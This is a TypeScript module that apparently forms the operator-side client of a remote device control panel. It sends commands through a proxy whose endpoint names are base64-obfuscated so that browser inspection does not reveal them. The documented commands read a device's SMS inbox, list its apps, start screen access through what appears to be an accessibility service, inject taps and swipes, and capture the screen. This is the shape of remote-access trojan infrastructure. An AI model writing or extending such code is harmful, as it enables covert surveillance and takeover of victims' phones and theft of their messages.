/**
 * API Proxy Utilities
 * 
 * This module provides obfuscated API endpoints to hide backend calls
 * from browser inspection. All endpoints are base64 encoded.
 */

// Obfuscated endpoint mappings (base64 encoded)
const ENDPOINTS = {
  // Device command endpoint: /api/command/{deviceId}
  DEVICE_COMMAND: Buffer.from('device-command').toString('base64'),
  // Device query endpoint: /devices
  DEVICE_QUERY: Buffer.from('device-query').toString('base64'),
  // Device interact endpoint: /api/interact/{deviceId}
  DEVICE_INTERACT: Buffer.from('device-interact').toString('base64'),
  // Device screen endpoint: /api/screen/{deviceId}
  DEVICE_SCREEN: Buffer.from('device-screen').toString('base64'),
} as const;

/**
 * Get the obfuscated proxy endpoint URL
 * SECURITY: Device IDs are no longer in URLs - they're sent in request body/headers
 */
export function getProxyEndpoint(endpoint: keyof typeof ENDPOINTS, deviceId?: string): string {
  const encodedEndpoint = ENDPOINTS[endpoint];
  const baseUrl = '/api/proxy';
  
  // Device ID is now sent in body/header, not URL
  return `${baseUrl}/${encodedEndpoint}`;
}

/**
 * Make a proxied API call to device-server
 */
export interface ProxyRequestOptions {
  method?: 'GET' | 'POST' | 'PUT' | 'DELETE';
  body?: Record<string, unknown> | unknown;
  deviceId?: string;
  queryParams?: Record<string, string>;
}

export async function proxyRequest(
  endpoint: keyof typeof ENDPOINTS,
  options: ProxyRequestOptions = {}
): Promise<Response> {
  const { method = 'GET', body, deviceId, queryParams } = options;
  
  const url = getProxyEndpoint(endpoint);
  
  // Add query parameters if provided
  let finalUrl = url;
  if (queryParams && Object.keys(queryParams).length > 0) {
    const searchParams = new URLSearchParams(queryParams);
    finalUrl = `${url}?${searchParams.toString()}`;
  }
  
  const fetchOptions: RequestInit = {
    method,
    headers: {
      'Content-Type': 'application/json',
    },
  };
  
  // SECURITY: Device ID sent in header (for GET) or body (for POST), not URL
  if (deviceId) {
    if (method === 'GET') {
      // For GET requests, send device ID in header
      fetchOptions.headers = {
        ...fetchOptions.headers,
        'X-Device-ID': deviceId,
      };
    } else {
      // For POST/PUT/DELETE, include device ID in body
      const bodyWithDeviceId = {
        ...(body && typeof body === 'object' ? body : {}),
        _deviceId: deviceId, // Internal field, will be extracted server-side
      };
      fetchOptions.body = JSON.stringify(bodyWithDeviceId);
    }
  } else if (body) {
    fetchOptions.body = JSON.stringify(body);
  }
  
  return fetch(finalUrl, fetchOptions);
}

/**
 * Device command interface for sending commands to device-server
 * 
 * The device-server expects:
 * - `cmd` (required): The command name (e.g., "getinfo", "getsms", "access-command")
 * - `param` (optional): Command parameter as a string (e.g., "inbox|50|10" for getsms)
 * - `data` (optional): Additional command data as an object
 * 
 * @example
 * ```typescript
 * // Simple command
 * { cmd: "getinfo" }
 * 
 * // Command with parameter
 * { cmd: "getsms", param: "inbox|50|10" }
 * 
 * // Command with data
 * { cmd: "access-command", param: "start-screen", data: { timeout: 5000 } }
 * ```
 */
export interface DeviceCommand {
  /**
   * Command name (required)
   * Examples: "getinfo", "getsms", "getapps", "access-command", "input"
   */
  cmd: string;
  
  /**
   * Optional command parameter as a string
   * Used for commands that accept string parameters (e.g., "inbox|50|10" for getsms)
   */
  param?: string;
  
  /**
   * Optional command data as an object
   * Used for commands that require additional structured data
   */
  data?: Record<string, unknown>;
}

/**
 * Validates a device command before sending
 */
function validateDeviceCommand(command: DeviceCommand): void {
  if (!command.cmd || typeof command.cmd !== 'string' || command.cmd.trim().length === 0) {
    throw new Error("Device command 'cmd' is required and must be a non-empty string");
  }
  
  // Validate cmd doesn't contain dangerous characters
  if (!/^[a-zA-Z0-9_-]+$/.test(command.cmd)) {
    throw new Error("Device command 'cmd' contains invalid characters");
  }
  
  // Validate param if provided
  if (command.param !== undefined) {
    if (typeof command.param !== 'string') {
      throw new Error("Device command 'param' must be a string if provided");
    }
    // Param can contain various characters (e.g., "inbox|50|10"), so we don't restrict it too much
    // But prevent obvious injection attempts
    if (command.param.length > 1000) {
      throw new Error("Device command 'param' is too long (max 1000 characters)");
    }
  }
  
  // Validate data if provided
  if (command.data !== undefined) {
    if (typeof command.data !== 'object' || command.data === null || Array.isArray(command.data)) {
      throw new Error("Device command 'data' must be an object if provided");
    }
  }
}

/**
 * Helper function to proxy device command
 * 
 * @param deviceId - The device ID to send the command to
 * @param command - The device command (cmd is required)
 * @returns Promise resolving to the response from device-server
 * @throws Error if command validation fails
 */
export async function proxyDeviceCommand(
  deviceId: string,
  command: DeviceCommand
): Promise<Response> {
  // Validate command before sending
  validateDeviceCommand(command);
  
  return proxyRequest('DEVICE_COMMAND', {
    method: 'POST',
    deviceId,
    body: command,
  });
}

/**
 * Helper function to proxy device query (get devices list)
 */
export async function proxyDeviceQuery(queryParams: Record<string, string> = {}): Promise<Response> {
  return proxyRequest('DEVICE_QUERY', {
    method: 'GET',
    queryParams,
  });
}

/**
 * Helper function to proxy device interaction (tap, swipe, etc.)
 */
export interface DeviceInteraction {
  type?: string;
  x?: number;
  y?: number;
  deltaX?: number;
  deltaY?: number;
  duration?: number;
}

export async function proxyDeviceInteract(
  deviceId: string,
  interaction: DeviceInteraction
): Promise<Response> {
  return proxyRequest('DEVICE_INTERACT', {
    method: 'POST',
    deviceId,
    body: interaction,
  });
}

/**
 * Helper function to proxy device screen capture
 */
export async function proxyDeviceScreen(deviceId: string): Promise<Response> {
  return proxyRequest('DEVICE_SCREEN', {
    method: 'GET',
    deviceId,
  });
}

